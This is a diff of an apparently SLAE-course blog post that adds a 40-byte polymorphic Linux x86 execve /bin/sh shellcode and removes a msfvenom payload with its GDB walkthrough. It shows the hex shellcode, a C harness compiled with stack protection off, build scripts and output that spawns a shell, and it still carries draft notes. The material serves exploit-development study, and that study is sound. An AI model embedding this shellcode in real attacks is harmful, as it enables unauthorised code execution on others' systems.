@@ -127,29 +127,57 @@ section .text
         int 0x80                        ; call the interrupt to execute the execve syscall, execute /bin/sh shell
 ```
 
-What's my shellcode size 40 bytes ... edit stuff here onward
+The Assembly code is compiled by assembling with Nasm, and linking with the following bash script whilst outputting an executable binary:
 
 ```bash
-osboxes@osboxes:~/Downloads/SLAE$ msfvenom -p linux/x86/exec CMD=/bin/sh --arch x86 --platform linux -f c
-No encoder or badchars specified, outputting raw payload
-Payload size: 43 bytes
-Final size of c file: 205 bytes
-unsigned char buf[] = 
-"\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68\x2f\x73\x68"
-"\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52\xe8\x08\x00\x00\x00\x2f"
-"\x62\x69\x6e\x2f\x73\x68\x00\x57\x53\x89\xe1\xcd\x80";
+osboxes@osboxes:~/Downloads/SLAE$ cat compile.sh
+#!/bin/bash
+
+echo '[+] Assembling with Nasm ... '
+nasm -f elf32 -o $1.o $1.nasm
+
+echo '[+] Linking ...'
+ld -o $1 $1.o
+
+echo '[+] Done!'
+```
+
+The Assembly code compiled as an executable binary:
+
+```bash
+osboxes@osboxes:~/Downloads/SLAE$ ./compile.sh execve_poly
+[+] Assembling with Nasm ... 
+[+] Linking ...
+[+] Done!
+```
+
+The compiled binary is executed:
+
+```bash
+osboxes@osboxes:~/Downloads/SLAE$ ./execve_poly 
+$ id
+uid=1000(osboxes) gid=1000(osboxes) groups=1000(osboxes),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),109(lpadmin),124(sambashare)
+$ exit
+```
+
+Objdump is used to extract the shellcode from the Execve shell in hex format (Null free):
+
+
+```bash
+osboxes@osboxes:~/Downloads/SLAE$ objdump -d ./execve_poly|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g' 
+"\x31\xd2\x52\xb8\xb7\xd8\x3e\x56\x05\x78\x56\x34\x12\x50\xb8\xde\xc0\xad\xde\x2d\xaf\x5e\x44\x70\x50\x6a\x0b\x58\x89\xd1\x89\xe3\x6a\x01\x5e\xcd\x80\x96\xcd\x80"
 ```
 
 A C program scripted with the newly generated shellcode:
 
-```c
+```c 
 /**
-* Filename: exec_shellcode.c
+* Filename: execve_poly_shellcode.c
 * Author: h3ll0clar1c3
-* Purpose: Spawn a shell on the local host  
-* Compilation: gcc -fno-stack-protector -z execstack -m32 exec_shellcode.c -o exec  
-* Usage: ./exec
-* Shellcode size: 15 bytes
+* Purpose: Spawn a shell on the local host   
+* Compilation: gcc -fno-stack-protector -z execstack -m32 execve_poly_shellcode.c -o execve_poly_final  
+* Usage: ./execve_poly_final
+* Shellcode size: 40 bytes
 * Architecture: x86
 **/
 
@@ -157,9 +185,8 @@ A C program scripted with the newly generated shellcode:
 #include <string.h>
 
 unsigned char code[] = \
-"\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68\x2f\x73\x68"
-"\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52\xe8\x08\x00\x00\x00\x2f"
-"\x62\x69\x6e\x2f\x73\x68\x00\x57\x53\x89\xe1\xcd\x80";
+"\x31\xd2\x52\xb8\xb7\xd8\x3e\x56\x05\x78\x56\x34\x12\x50\xb8\xde\xc0\xad\xde\x2d"
+"\xaf\x5e\x44\x70\x50\x6a\x0b\x58\x89\xd1\x89\xe3\x6a\x01\x5e\xcd\x80\x96\xcd\x80";
 
 int main()
 {
@@ -169,97 +196,20 @@ int main()
 }
 ```
 
-As a POC, the C program is compiled as an executable binary with stack-protection disabled, and executed resulting in a shellcode size of 15 bytes:
+As a POC, the C program is compiled as an executable binary with stack-protection disabled, and executed resulting in a shellcode size of 40 bytes:
 
 ```bash
-osboxes@osboxes:~/Downloads/SLAE$ gcc -fno-stack-protector -zexecstack exec_shellcode.c -o exec
-osboxes@osboxes:~/Downloads/SLAE$ ./exec 
-Shellcode length:  15
-$ id
-uid=1000(osboxes) gid=1000(osboxes) groups=1000(osboxes),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),109(lpadmin),124(sambashare)
-```
-
-The GDB (GNU Debugger) tool is used to step through the program code and analyze the system calls:
-
-```bash
-osboxes@osboxes:~/Downloads/SLAE$ gdb ./exec --quiet
-Reading symbols from /home/osboxes/Downloads/SLAE/exec...(no debugging symbols found)...done.
-(gdb) set disassembly-flavor intel
-(gdb) break *&code
-Breakpoint 1 at 0x804a040
-(gdb) run
-Starting program: /home/osboxes/Downloads/SLAE/exec 
-Shellcode length:  15
-
-Breakpoint 1, 0x0804a040 in code ()
-(gdb) disassemble 
-Dump of assembler code for function code:
-=> 0x0804a040 <+0>:	push   0xb                            ; push 0xb (11) onto the stack
-   0x0804a042 <+2>:	pop    eax                            ; pop 0xb into eax  
-   0x0804a043 <+3>:	cdq                                   ; set edx to 0
-   0x0804a044 <+4>:	push   edx                            ; push 0 onto the stack
-   0x0804a045 <+5>:	pushw  0x632d                         ; push -c argument onto the stack
-   0x0804a049 <+9>:	mov    edi,esp                        ; move stack pointer into edi
-   0x0804a04b <+11>:	push   0x68732f                       ; push hs/ onto the stack (/bin/sh in reverse order)
-   0x0804a050 <+16>:	push   0x6e69622f                     ; push nib/ onto the stack (/bin/sh in reverse order)
-   0x0804a055 <+21>:	mov    ebx,esp                        ; move stack pointer into ebx
-   0x0804a057 <+23>:	push   edx                            ; push 0 onto the stack
-   0x0804a058 <+24>:	call   0x804a065 <code+37>            ; call address 0x804a065 (/usr/bin/id)
-   0x0804a05d <+29>:	das    
-   0x0804a05e <+30>:	bound  ebp,QWORD PTR [ecx+0x6e]
-   0x0804a061 <+33>:	das    
-   0x0804a062 <+34>:	jae    0x804a0cc
-   0x0804a064 <+36>:	add    BYTE PTR [edi+0x53],dl
-   0x0804a067 <+39>:	mov    ecx,esp                        ; move stack pointer into ecx
-   0x0804a069 <+41>:	int    0x80                           ; call the interrupt to execute the execve syscall
-   0x0804a06b <+43>:	add    BYTE PTR [eax],al
-End of assembler dump.
-(gdb) break *0x0804a069
-Breakpoint 2 at 0x804a069
-(gdb) c
-Continuing.
-
-Breakpoint 2, 0x0804a069 in code ()
-(gdb) disassemble 
-Dump of assembler code for function code:
-   0x0804a040 <+0>:	push   0xb
-   0x0804a042 <+2>:	pop    eax
-   0x0804a043 <+3>:	cdq    
-   0x0804a044 <+4>:	push   edx
-   0x0804a045 <+5>:	pushw  0x632d
-   0x0804a049 <+9>:	mov    edi,esp
-   0x0804a04b <+11>:	push   0x68732f
-   0x0804a050 <+16>:	push   0x6e69622f
-   0x0804a055 <+21>:	mov    ebx,esp
-   0x0804a057 <+23>:	push   edx
-   0x0804a058 <+24>:	call   0x804a065 <code+37>
-   0x0804a05d <+29>:	das    
-   0x0804a05e <+30>:	bound  ebp,QWORD PTR [ecx+0x6e]
-   0x0804a061 <+33>:	das    
-   0x0804a062 <+34>:	jae    0x804a0cc
-   0x0804a064 <+36>:	add    BYTE PTR [edi+0x53],dl
-   0x0804a067 <+39>:	mov    ecx,esp
-=> 0x0804a069 <+41>:	int    0x80
-   0x0804a06b <+43>:	add    BYTE PTR [eax],al
-End of assembler dump.
-(gdb) stepi
-process 6223 is executing new program: /bin/dash
-Error in re-setting breakpoint 1: No symbol table is loaded.  Use the "file" command.
-Error in re-setting breakpoint 1: No symbol table is loaded.  Use the "file" command.
-Error in re-setting breakpoint 1: No symbol table is loaded.  Use the "file" command.
+osboxes@osboxes:~/Downloads/SLAE$ gcc -fno-stack-protector -z execstack -m32 execve_poly_shellcode.c -o execve_poly_final
+osboxes@osboxes:~/Downloads/SLAE/Assignment_6$ ./execve_poly_final 
+Shellcode length:  40
 $ id
 uid=1000(osboxes) gid=1000(osboxes) groups=1000(osboxes),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),109(lpadmin),124(sambashare)
 $ exit
-[Inferior 1 (process 6223) exited normally]
-(gdb) quit
-``` 
- 
-The disassembled code consists of the following components:
+```
 
-* execve syscall -> <code class="language-plaintext highlighter-rouge">0xb</code>
-* -c argument -> <code class="language-plaintext highlighter-rouge">0x632d</code>
-* <code class="language-plaintext highlighter-rouge">/bin/sh</code> -> <code class="language-plaintext highlighter-rouge">0x68732f & <code class="language-plaintext highlighter-rouge">0x6e69622f</code> 
-* call instruction -> <code class="language-plaintext highlighter-rouge">/usr/bin/id</code> 
+The polymorphic version of the shellcode is 43% larger in size as compared to the original reference from Shell-Storm.
+
+CARYY ON HERE >>> ;-)
 
 #### 2nd Shellcode (linux/x86/shell_reverse_tcp)
 --------------
